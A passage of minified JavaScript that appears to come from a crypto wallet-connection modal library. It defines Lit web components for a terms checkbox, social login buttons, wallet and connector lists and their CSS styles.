`;var qae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let tI=class extends $e{constructor(){super(),this.unsubscribe=[],this.checked=Qm.state.isLegalCheckboxChecked,this.unsubscribe.push(Qm.subscribeKey("isLegalCheckboxChecked",e=>{this.checked=e}))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state,r=de.state.features?.legalCheckbox;return!e&&!n||!r?null:X`
      <wui-checkbox
        ?checked=${this.checked}
        @checkboxChange=${this.onCheckboxChange.bind(this)}
        data-testid="wui-checkbox"
      >
        <wui-text color="secondary" variant="sm-regular" align="left">
          I agree to our ${this.termsTemplate()} ${this.andTemplate()} ${this.privacyTemplate()}
        </wui-text>
      </wui-checkbox>
    `}andTemplate(){const{termsConditionsUrl:e,privacyPolicyUrl:n}=de.state;return e&&n?"and":""}termsTemplate(){const{termsConditionsUrl:e}=de.state;return e?X`<a rel="noreferrer" target="_blank" href=${e}>terms of service</a>`:null}privacyTemplate(){const{privacyPolicyUrl:e}=de.state;return e?X`<a rel="noreferrer" target="_blank" href=${e}>privacy policy</a>`:null}onCheckboxChange(){Qm.setIsLegalCheckboxChecked(!this.checked)}};tI.styles=[S7e];qae([Ee()],tI.prototype,"checked",void 0);tI=qae([Ue("w3m-legal-checkbox")],tI);const T7e=ot`
  :host {
    display: flex;
    justify-content: center;
    align-items: center;
    width: 40px;
    height: 40px;
    border-radius: ${({borderRadius:t})=>t[20]};
    overflow: hidden;
  }

  wui-icon {
    width: 100%;
    height: 100%;
  }
`;var Vae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let nI=class extends $e{constructor(){super(...arguments),this.logo="google"}render(){return X`<wui-icon color="inherit" size="inherit" name=${this.logo}></wui-icon> `}};nI.styles=[Dt,T7e];Vae([ie()],nI.prototype,"logo",void 0);nI=Vae([Ue("wui-logo")],nI);const x7e=ot`
  :host {
    width: 100%;
  }

  button {
    display: flex;
    align-items: center;
    justify-content: space-between;
    padding: ${({spacing:t})=>t[3]};
    width: 100%;
    background-color: transparent;
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  wui-text {
    text-transform: capitalize;
  }

  @media (hover: hover) {
    button:hover:enabled {
      background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    }
  }

  button:disabled {
    opacity: 0.5;
    cursor: not-allowed;
  }
`;var _A=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Sg=class extends $e{constructor(){super(...arguments),this.logo="google",this.name="Continue with google",this.disabled=!1}render(){return X`
      <button ?disabled=${this.disabled} tabindex=${et(this.tabIdx)}>
        <wui-flex gap="2" alignItems="center">
          <wui-image ?boxed=${!0} logo=${this.logo}></wui-image>
          <wui-text variant="lg-regular" color="primary">${this.name}</wui-text>
        </wui-flex>
        <wui-icon name="chevronRight" size="lg" color="default"></wui-icon>
      </button>
    `}};Sg.styles=[Dt,nr,x7e];_A([ie()],Sg.prototype,"logo",void 0);_A([ie()],Sg.prototype,"name",void 0);_A([ie()],Sg.prototype,"tabIdx",void 0);_A([ie({type:Boolean})],Sg.prototype,"disabled",void 0);Sg=_A([Ue("wui-list-social")],Sg);const I7e=ot`
  :host {
    display: block;
    width: 100%;
  }

  button {
    width: 100%;
    height: 52px;
    display: flex;
    align-items: center;
    justify-content: center;
    background: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[4]};
  }

  @media (hover: hover) {
    button:hover:enabled {
      background: ${({tokens:t})=>t.theme.foregroundSecondary};
    }
  }

  button:disabled {
    cursor: not-allowed;
    opacity: 0.5;
  }
`;var g8=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let D1=class extends $e{constructor(){super(...arguments),this.logo="google",this.disabled=!1,this.tabIdx=void 0}render(){return X`
      <button ?disabled=${this.disabled} tabindex=${et(this.tabIdx)}>
        <wui-icon size="xxl" name=${this.logo}></wui-icon>
      </button>
    `}};D1.styles=[Dt,nr,I7e];g8([ie()],D1.prototype,"logo",void 0);g8([ie({type:Boolean})],D1.prototype,"disabled",void 0);g8([ie()],D1.prototype,"tabIdx",void 0);D1=g8([Ue("wui-logo-select")],D1);const R7e=ot`
  wui-separator {
    margin: ${({spacing:t})=>t[3]} calc(${({spacing:t})=>t[3]} * -1)
      ${({spacing:t})=>t[3]} calc(${({spacing:t})=>t[3]} * -1);
    width: calc(100% + ${({spacing:t})=>t[3]} * 2);
  }
`;var Xp=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const hW=2,pW=6;let Xl=class extends $e{constructor(){super(),this.unsubscribe=[],this.walletGuide="get-started",this.tabIdx=void 0,this.connectors=Ce.state.connectors,this.remoteFeatures=de.state.remoteFeatures,this.authConnector=this.connectors.find(e=>e.type==="AUTH"),this.isPwaLoading=!1,this.hasExceededUsageLimit=Ge.state.plan.hasExceededUsageLimit,this.unsubscribe.push(Ce.subscribeKey("connectors",e=>{this.connectors=e,this.authConnector=this.connectors.find(n=>n.type==="AUTH")}),de.subscribeKey("remoteFeatures",e=>this.remoteFeatures=e),Ge.subscribeKey("plan",e=>this.hasExceededUsageLimit=e.hasExceededUsageLimit))}connectedCallback(){super.connectedCallback(),this.handlePwaFrameLoad()}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X`
      <wui-flex
        class="container"
        flexDirection="column"
        gap="2"
        data-testid="w3m-social-login-widget"
      >
        ${this.topViewTemplate()}${this.bottomViewTemplate()}
      </wui-flex>
    `}topViewTemplate(){const e=this.walletGuide==="explore";let n=this.remoteFeatures?.socials;return!n&&e?(n=jt.DEFAULT_SOCIALS,this.renderTopViewContent(n)):n?this.renderTopViewContent(n):null}renderTopViewContent(e){return e.length===2?X` <wui-flex gap="2">
        ${e.slice(0,hW).map(n=>X`<wui-logo-select
              data-testid=${`social-selector-${n}`}
              @click=${()=>{this.onSocialClick(n)}}
              logo=${n}
              tabIdx=${et(this.tabIdx)}
              ?disabled=${this.isPwaLoading||this.hasConnection()}
            ></wui-logo-select>`)}
      </wui-flex>`:X` <wui-list-button
      data-testid=${`social-selector-${e[0]}`}
      @click=${()=>{this.onSocialClick(e[0])}}
      size="lg"
      icon=${et(e[0])}
      text=${`Continue with ${Cr.capitalize(e[0])}`}
      tabIdx=${et(this.tabIdx)}
      ?disabled=${this.isPwaLoading||this.hasConnection()}
    ></wui-list-button>`}bottomViewTemplate(){let e=this.remoteFeatures?.socials;const n=this.walletGuide==="explore";return(!this.authConnector||!e||e.length===0)&&n&&(e=jt.DEFAULT_SOCIALS),!e||e.length<=hW?null:e&&e.length>pW?X`<wui-flex gap="2">
        ${e.slice(1,pW-1).map(i=>X`<wui-logo-select
              data-testid=${`social-selector-${i}`}
              @click=${()=>{this.onSocialClick(i)}}
              logo=${i}
              tabIdx=${et(this.tabIdx)}
              ?focusable=${this.tabIdx!==void 0&&this.tabIdx>=0}
              ?disabled=${this.isPwaLoading||this.hasConnection()}
            ></wui-logo-select>`)}
        <wui-logo-select
          logo="more"
          tabIdx=${et(this.tabIdx)}
          @click=${this.onMoreSocialsClick.bind(this)}
          ?disabled=${this.isPwaLoading||this.hasConnection()}
          data-testid="social-selector-more"
        ></wui-logo-select>
      </wui-flex>`:e?X`<wui-flex gap="2">
      ${e.slice(1,e.length).map(i=>X`<wui-logo-select
            data-testid=${`social-selector-${i}`}
            @click=${()=>{this.onSocialClick(i)}}
            logo=${i}
            tabIdx=${et(this.tabIdx)}
            ?focusable=${this.tabIdx!==void 0&&this.tabIdx>=0}
            ?disabled=${this.isPwaLoading||this.hasConnection()}
          ></wui-logo-select>`)}
    </wui-flex>`:null}onMoreSocialsClick(){we.push("ConnectSocials")}async onSocialClick(e){if(this.hasExceededUsageLimit){we.push("UsageExceeded");return}if(!ge.AUTH_CONNECTOR_SUPPORTED_CHAINS.find(r=>r===Y.state.activeChain)){const r=Y.getFirstCaipNetworkSupportsAuthConnector();if(r){we.push("SwitchNetwork",{network:r});return}}e&&await S9e(e)}async handlePwaFrameLoad(){if(xe.isPWA()){this.isPwaLoading=!0;try{this.authConnector?.provider instanceof kre&&await this.authConnector.provider.init()}catch(e){Yi.open({displayMessage:"Error loading embedded wallet in PWA",debugMessage:e.message},"error")}finally{this.isPwaLoading=!1}}}hasConnection(){return ke.hasAnyConnection(ge.CONNECTOR_ID.AUTH)}};Xl.styles=R7e;Xp([ie()],Xl.prototype,"walletGuide",void 0);Xp([ie()],Xl.prototype,"tabIdx",void 0);Xp([Ee()],Xl.prototype,"connectors",void 0);Xp([Ee()],Xl.prototype,"remoteFeatures",void 0);Xp([Ee()],Xl.prototype,"authConnector",void 0);Xp([Ee()],Xl.prototype,"isPwaLoading",void 0);Xp([Ee()],Xl.prototype,"hasExceededUsageLimit",void 0);Xl=Xp([Ue("w3m-social-login-widget")],Xl);const P7e=ot`
  :host {
    position: relative;
    border-radius: ${({borderRadius:t})=>t[2]};
    width: 40px;
    height: 40px;
    overflow: hidden;
    background: ${({tokens:t})=>t.theme.foregroundPrimary};
    display: flex;
    justify-content: center;
    align-items: center;
    flex-wrap: wrap;
    column-gap: ${({spacing:t})=>t[1]};
    padding: ${({spacing:t})=>t[1]};
  }

  :host > wui-wallet-image {
    width: 14px;
    height: 14px;
    border-radius: 2px;
  }
`;var Wae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const W9=4;let rI=class extends $e{constructor(){super(...arguments),this.walletImages=[]}render(){const e=this.walletImages.length<W9;return X`${this.walletImages.slice(0,W9).map(({src:n,walletName:r})=>X`
          <wui-wallet-image
            size="sm"
            imageSrc=${n}
            name=${et(r)}
          ></wui-wallet-image>
        `)}
    ${e?[...Array(W9-this.walletImages.length)].map(()=>X` <wui-wallet-image size="sm" name=""></wui-wallet-image>`):null} `}};rI.styles=[Dt,P7e];Wae([ie({type:Array})],rI.prototype,"walletImages",void 0);rI=Wae([Ue("wui-all-wallets-image")],rI);const N7e=ot`
  :host {
    width: 100%;
  }

  button {
    column-gap: ${({spacing:t})=>t[2]};
    padding: ${({spacing:t})=>t[3]};
    width: 100%;
    background-color: transparent;
    border-radius: ${({borderRadius:t})=>t[4]};
    color: ${({tokens:t})=>t.theme.textPrimary};
  }

  button > wui-wallet-image {
    background: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  button > wui-text:nth-child(2) {
    display: flex;
    flex: 1;
  }

  button:hover:enabled {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  button[data-all-wallets='true'] {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  button[data-all-wallets='true']:hover:enabled {
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
  }

  button:focus-visible:enabled {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    box-shadow: 0 0 0 4px ${({tokens:t})=>t.core.foregroundAccent020};
  }

  button:disabled {
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    opacity: 0.5;
    cursor: not-allowed;
  }

  button:disabled > wui-tag {
    background-color: ${({tokens:t})=>t.core.glass010};
    color: ${({tokens:t})=>t.theme.foregroundTertiary};
  }

  wui-flex.namespace-icon {
    width: 16px;
    height: 16px;
    border-radius: ${({borderRadius:t})=>t.round};
    background-color: ${({tokens:t})=>t.theme.foregroundSecondary};
    box-shadow: 0 0 0 2px ${({tokens:t})=>t.theme.backgroundPrimary};
    transition: box-shadow var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2);
  }

  button:hover:enabled wui-flex.namespace-icon {
    box-shadow: 0 0 0 2px ${({tokens:t})=>t.theme.foregroundPrimary};
  }

  wui-flex.namespace-icon > wui-icon {
    width: 10px;
    height: 10px;
  }

  wui-flex.namespace-icon:not(:first-child) {
    margin-left: -4px;
  }
`;var da=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const O7e={eip155:"ethereum",solana:"solana",bip122:"bitcoin",polkadot:void 0,cosmos:void 0,sui:void 0,stacks:void 0,ton:"ton"};let Js=class extends $e{constructor(){super(...arguments),this.walletImages=[],this.imageSrc="",this.name="",this.size="md",this.tabIdx=void 0,this.namespaces=[],this.disabled=!1,this.showAllWallets=!1,this.loading=!1,this.loadingSpinnerColor="accent-100"}render(){return this.dataset.size=this.size,X`
      <button
        ?disabled=${this.disabled}
        data-all-wallets=${this.showAllWallets}
        tabindex=${et(this.tabIdx)}
      >
        ${this.templateAllWallets()} ${this.templateWalletImage()}
        <wui-flex flexDirection="column" justifyContent="center" alignItems="flex-start" gap="1">
          <wui-text variant="lg-regular" color="inherit">${this.name}</wui-text>
          ${this.templateNamespaces()}
        </wui-flex>
        ${this.templateStatus()}
        <wui-icon name="chevronRight" size="lg" color="default"></wui-icon>
      </button>
    `}templateNamespaces(){return this.namespaces?.length?X`<wui-flex alignItems="center" gap="0">
        ${this.namespaces.map((e,n)=>X`<wui-flex
              alignItems="center"
              justifyContent="center"
              zIndex=${(this.namespaces?.length??0)*2-n}
              class="namespace-icon"
            >
              <wui-icon
                name=${et(O7e[e])}
                size="sm"
                color="default"
              ></wui-icon>
            </wui-flex>`)}
      </wui-flex>`:null}templateAllWallets(){return this.showAllWallets&&this.imageSrc?X` <wui-all-wallets-image .imageeSrc=${this.imageSrc}> </wui-all-wallets-image> `:this.showAllWallets&&this.walletIcon?X` <wui-wallet-image .walletIcon=${this.walletIcon} size="sm"> </wui-wallet-image> `:null}templateWalletImage(){return!this.showAllWallets&&this.imageSrc?X`<wui-wallet-image
        size=${et(this.size==="sm"?"sm":"md")}
        imageSrc=${this.imageSrc}
        name=${this.name}
      ></wui-wallet-image>`:!this.showAllWallets&&!this.imageSrc?X`<wui-wallet-image size="sm" name=${this.name}></wui-wallet-image>`:null}templateStatus(){return this.loading?X`<wui-loading-spinner size="lg" color="accent-primary"></wui-loading-spinner>`:this.tagLabel&&this.tagVariant?X`<wui-tag size="sm" variant=${this.tagVariant}>${this.tagLabel}</wui-tag>`:null}};Js.styles=[Dt,nr,N7e];da([ie({type:Array})],Js.prototype,"walletImages",void 0);da([ie()],Js.prototype,"imageSrc",void 0);da([ie()],Js.prototype,"name",void 0);da([ie()],Js.prototype,"size",void 0);da([ie()],Js.prototype,"tagLabel",void 0);da([ie()],Js.prototype,"tagVariant",void 0);da([ie()],Js.prototype,"walletIcon",void 0);da([ie()],Js.prototype,"tabIdx",void 0);da([ie({type:Array})],Js.prototype,"namespaces",void 0);da([ie({type:Boolean})],Js.prototype,"disabled",void 0);da([ie({type:Boolean})],Js.prototype,"showAllWallets",void 0);da([ie({type:Boolean})],Js.prototype,"loading",void 0);da([ie({type:String})],Js.prototype,"loadingSpinnerColor",void 0);Js=da([Ue("wui-list-wallet")],Js);var dw=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Tg=class extends $e{constructor(){super(),this.unsubscribe=[],this.tabIdx=void 0,this.connectors=Ce.state.connectors,this.count=Ge.state.count,this.filteredCount=Ge.state.filteredWallets.length,this.isFetchingRecommendedWallets=Ge.state.isFetchingRecommendedWallets,this.unsubscribe.push(Ce.subscribeKey("connectors",e=>this.connectors=e),Ge.subscribeKey("count",e=>this.count=e),Ge.subscribeKey("filteredWallets",e=>this.filteredCount=e.length),Ge.subscribeKey("isFetchingRecommendedWallets",e=>this.isFetchingRecommendedWallets=e))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){const e=this.connectors.find(l=>l.id==="walletConnect"),{allWallets:n}=de.state;if(!e||n==="HIDE"||n==="ONLY_MOBILE"&&!xe.isMobile())return null;const r=Ge.state.featured.length,i=this.count+r,s=i<10?i:Math.floor(i/10)*10,o=this.filteredCount>0?this.filteredCount:s;let a=`${o}`;this.filteredCount>0?a=`${this.filteredCount}`:o<i&&(a=`${o}+`);const c=ke.hasAnyConnection(ge.CONNECTOR_ID.WALLET_CONNECT);return X`
      <wui-list-wallet
        name="Search Wallet"
        walletIcon="search"
        showAllWallets
        @click=${this.onAllWallets.bind(this)}
        tagLabel=${a}
        tagVariant="info"
        data-testid="all-wallets"
        tabIdx=${et(this.tabIdx)}
        .loading=${this.isFetchingRecommendedWallets}
        ?disabled=${c}
        size="sm"
      ></wui-list-wallet>
    `}onAllWallets(){tt.sendEvent({type:"track",event:"CLICK_ALL_WALLETS"}),we.push("AllWallets",{redirectView:we.state.data?.redirectView})}};dw([ie()],Tg.prototype,"tabIdx",void 0);dw([Ee()],Tg.prototype,"connectors",void 0);dw([Ee()],Tg.prototype,"count",void 0);dw([Ee()],Tg.prototype,"filteredCount",void 0);dw([Ee()],Tg.prototype,"isFetchingRecommendedWallets",void 0);Tg=dw([Ue("w3m-all-wallets-widget")],Tg);const k7e=ot`
  :host {
    margin-top: ${({spacing:t})=>t[1]};
  }
  wui-separator {
    margin: ${({spacing:t})=>t[3]} calc(${({spacing:t})=>t[3]} * -1)
      ${({spacing:t})=>t[2]} calc(${({spacing:t})=>t[3]} * -1);
    width: calc(100% + ${({spacing:t})=>t[3]} * 2);
  }
`;var Gf=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Fu=class extends $e{constructor(){super(),this.unsubscribe=[],this.connectors=Ce.state.connectors,this.recommended=Ge.state.recommended,this.featured=Ge.state.featured,this.explorerWallets=Ge.state.explorerWallets,this.connections=ke.state.connections,this.connectorImages=Pi.state.connectorImages,this.loadingTelegram=!1,this.unsubscribe.push(Ce.subscribeKey("connectors",e=>this.connectors=e),ke.subscribeKey("connections",e=>this.connections=e),Pi.subscribeKey("connectorImages",e=>this.connectorImages=e),Ge.subscribeKey("recommended",e=>this.recommended=e),Ge.subscribeKey("featured",e=>this.featured=e),Ge.subscribeKey("explorerFilteredWallets",e=>{this.explorerWallets=e?.length?e:Ge.state.explorerWallets}),Ge.subscribeKey("explorerWallets",e=>{this.explorerWallets?.length||(this.explorerWallets=e)})),xe.isTelegram()&&xe.isIos()&&(this.loadingTelegram=!ke.state.wcUri,this.unsubscribe.push(ke.subscribeKey("wcUri",e=>this.loadingTelegram=!e)))}disconnectedCallback(){this.unsubscribe.forEach(e=>e())}render(){return X`
      <wui-flex flexDirection="column" gap="2"> ${this.connectorListTemplate()} </wui-flex>
    `}processConnectorsByType(e,n=!0){const r=Va.sortConnectorsByExplorerWallet([...e]);return n?r.filter(Va.showConnector):r}connectorListTemplate(){const e=Va.getConnectorsByType(this.connectors,this.recommended,this.featured),n=this.processConnectorsByType(e.announced.filter(w=>w.id!=="walletConnect")),r=this.processConnectorsByType(e.injected),i=this.processConnectorsByType(e.multiChain.filter(w=>w.name!=="WalletConnect"),!1),s=e.custom,o=e.recent,a=this.processConnectorsByType(e.external.filter(w=>w.id!==ge.CONNECTOR_ID.COINBASE_SDK&&w.id!==ge.CONNECTOR_ID.BASE_ACCOUNT)),c=e.recommended,l=e.featured,f=Va.getConnectorTypeOrder({custom:s,recent:o,announced:n,injected:r,multiChain:i,recommended:c,featured:l,external:a}),h=this.connectors.find(w=>w.id==="walletConnect"),m=xe.isMobile(),b=[];for(const w of f)switch(w){case"walletConnect":{!m&&h&&b.push({kind:"connector",subtype:"walletConnect",connector:h});break}case"recent":{Va.getFilteredRecentWallets().forEach(E=>b.push({kind:"wallet",subtype:"recent",wallet:E}));break}case"injected":{i.forEach(y=>b.push({kind:"connector",subtype:"multiChain",connector:y})),n.forEach(y=>b.push({kind:"connector",subtype:"announced",connector:y})),r.forEach(y=>b.push({kind:"connector",subtype:"injected",connector:y}));break}case"featured":{l.forEach(y=>b.push({kind:"wallet",subtype:"featured",wallet:y}));break}case"custom":{Va.getFilteredCustomWallets(s??[]).forEach(E=>b.push({kind:"wallet",subtype:"custom",wallet:E}));break}case"external":{a.forEach(y=>b.push({kind:"connector",subtype:"external",connector:y}));break}case"recommended":{Va.getCappedRecommendedWallets(c).forEach(E=>b.push({kind:"wallet",subtype:"recommended",wallet:E}));break}default:console.warn(`Unknown connector type: ${w}`)}return b.map((w,y)=>w.kind==="connector"?this.renderConnector(w,y):this.renderWallet(w,y))}getConnectorNamespaces(e){return e.subtype==="walletConnect"?[]:e.subtype==="multiChain"?e.connector.connectors?.map(n=>n.chain)||[]:[e.connector.chain]}renderConnector(e,n){const r=e.connector,i=er.getConnectorImage(r)||this.connectorImages[r?.imageId??""],o=(this.connections.get(r.chain)??[]).some(h=>Gr.isLowerCaseMatch(h.connectorId,r.id));let a,c;e.subtype==="walletConnect"?(a="qr code",c="accent"):e.subtype==="injected"||e.subtype==="announced"?(a=o?"connected":"installed",c=o?"info":"success"):(a=void 0,c=void 0);const l=ke.hasAnyConnection(ge.CONNECTOR_ID.WALLET_CONNECT),f=e.subtype==="walletConnect"||e.subtype==="external"?l:!1;return X`
      <w3m-list-wallet
        displayIndex=${n}
        imageSrc=${et(i)}
        .installed=${!0}
        name=${r.name??"Unknown"}
        .tagVariant=${c}
        tagLabel=${et(a)}
        data-testid=${`wallet-selector-${r.id.toLowerCase()}`}
        size="sm"
        @click=${()=>this.onClickConnector(e)}
        tabIdx=${et(this.tabIdx)}
        ?disabled=${f}
        rdnsId=${et(r.explorerWallet?.rdns||void 0)}
        walletRank=${et(r.explorerWallet?.order)}
        .namespaces=${this.getConnectorNamespaces(e)}
      >
      </w3m-list-wallet>
    `}onClickConnector(e){const n=we.state.data?.redirectView;if(e.subtype==="walletConnect"){Ce.setActiveConnector(e.connector),xe.isMobile()?we.push("AllWallets"):we.push("ConnectingWalletConnect",{redirectView:n});return}if(e.subtype==="multiChain"){Ce.setActiveConnector(e.connector),we.push("ConnectingMultiChain",{redirectView:n});return}if(e.subtype==="injected"){Ce.setActiveConnector(e.connector),we.push("ConnectingExternal",{connector:e.connector,redirectView:n,wallet:e.connector.explorerWallet});return}if(e.subtype==="announced"){if(e.connector.id==="walletConnect"){xe.isMobile()?we.push("AllWallets"):we.push("ConnectingWalletConnect",{redirectView:n});return}we.push("ConnectingExternal",{connector:e.connector,redirectView:n,wallet:e.connector.explorerWallet});return}we.push("ConnectingExternal",{connector:e.connector,redirectView:n})}renderWallet(e,n){const r=e.wallet,i=er.getWalletImage(r),o=ke.hasAnyConnection(ge.CONNECTOR_ID.WALLET_CONNECT),a=this.loadingTelegram,c=e.subtype==="recent"?"recent":void 0,l=e.subtype==="recent"?"info":void 0;return X`
      <w3m-list-wallet
        displayIndex=${n}
        imageSrc=${et(i)}
        name=${r.name??"Unknown"}
        @click=${()=>this.onClickWallet(e)}
        size="sm"
        data-testid=${`wallet-selector-${r.id}`}
        tabIdx=${et(this.tabIdx)}
        ?loading=${a}
        ?disabled=${o}
        rdnsId=${et(r.rdns||void 0)}
        walletRank=${et(r.order)}
        tagLabel=${et(c)}
        .tagVariant=${l}
      >
      </w3m-list-wallet>
    `}onClickWallet(e){const n=we.state.data?.redirectView;if(e.subtype==="featured"){Ce.selectWalletConnector(e.wallet);return}if(e.subtype==="recent"){if(this.loadingTelegram)return;Ce.selectWalletConnector(e.wallet);return}if(e.subtype==="custom"){if(this.loadingTelegram)return;we.push("ConnectingWalletConnect",{wallet:e.wallet,redirectView:n});return}if(this.loadingTelegram)return;const r=Ce.getConnector({id:e.wallet.id,rdns:e.wallet.rdns});r?we.push("ConnectingExternal",{connector:r,redirectView:n}):we.push("ConnectingWalletConnect",{wallet:e.wallet,redirectView:n})}};Fu.styles=k7e;Gf([ie({type:Number})],Fu.prototype,"tabIdx",void 0);Gf([Ee()],Fu.prototype,"connectors",void 0);Gf([Ee()],Fu.prototype,"recommended",void 0);Gf([Ee()],Fu.prototype,"featured",void 0);Gf([Ee()],Fu.prototype,"explorerWallets",void 0);Gf([Ee()],Fu.prototype,"connections",void 0);Gf([Ee()],Fu.prototype,"connectorImages",void 0);Gf([Ee()],Fu.prototype,"loadingTelegram",void 0);Fu=Gf([Ue("w3m-connector-list")],Fu);var Gae=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let K7=class extends $e{constructor(){super(...arguments),this.tabIdx=void 0}render(){return X`
      <wui-flex flexDirection="column" gap="2">
        <w3m-connector-list tabIdx=${et(this.tabIdx)}></w3m-connector-list>
        <w3m-all-wallets-widget tabIdx=${et(this.tabIdx)}></w3m-all-wallets-widget>
      </wui-flex>
    `}};Gae([ie()],K7.prototype,"tabIdx",void 0);K7=Gae([Ue("w3m-wallet-login-list")],K7);const D7e=ot`
  :host {
    --connect-scroll--top-opacity: 0;
    --connect-scroll--bottom-opacity: 0;
    --connect-mask-image: none;
  }

  .connect {
    max-height: clamp(360px, 470px, 80vh);
    scrollbar-width: none;
    overflow-y: scroll;
    overflow-x: hidden;
    transition: opacity ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: opacity;
    mask-image: var(--connect-mask-image);
  }

  .guide {
    transition: opacity ${({durations:t})=>t.lg}
      ${({easings:t})=>t["ease-out-power-2"]};
    will-change: opacity;
  }

  .connect::-webkit-scrollbar {
    display: none;
  }

  .all-wallets {
    flex-flow: column;
  }

  .connect.disabled,
  .guide.disabled {
    opacity: 0.3;
    pointer-events: none;
    user-select: none;
  }

  wui-separator {
    margin: ${({spacing:t})=>t[3]} calc(${({spacing:t})=>t[3]} * -1);
    width: calc(100% + ${({spacing:t})=>t[3]} * 2);
  }
`;var Qc=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const B7e=470;let _o=class extends $e{constructor(){super(),this.unsubscribe=[],this.connectors=Ce.state.connectors,this.authConnector=this.connectors.find(e=>e.type==="AUTH"),this.features=de.state.features,this.remoteFeatures=de.state.remoteFeatures,this.enableWallets=de.state.enableWallets,this.noAdapters=Y.state.noAdapters,this.walletGuide="get-started",this.checked=Qm.state.isLegalCheckboxChecked,this.isEmailEnabled=this.remoteFeatures?.email&&!Y.state.noAdapters,this.isSocialEnabled=this.remoteFeatures?.socials&&this.remoteFeatures.socials.length>0&&!Y.state.noAdapters,this.isAuthEnabled=this.checkIfAuthEnabled(this.connectors),this.unsubscribe.push(Ce.subscribeKey("connectors",e=>{this.connectors=e,this.authConnector=this.connectors.find(n=>n.type==="AUTH"),this.isAuthEnabled=this.checkIfAuthEnabled(this.connectors)}),de.subscribeKey("features",e=>{this.features=e}),de.subscribeKey("remoteFeatures",e=>{this.remoteFeatures=e,this.setEmailAndSocialEn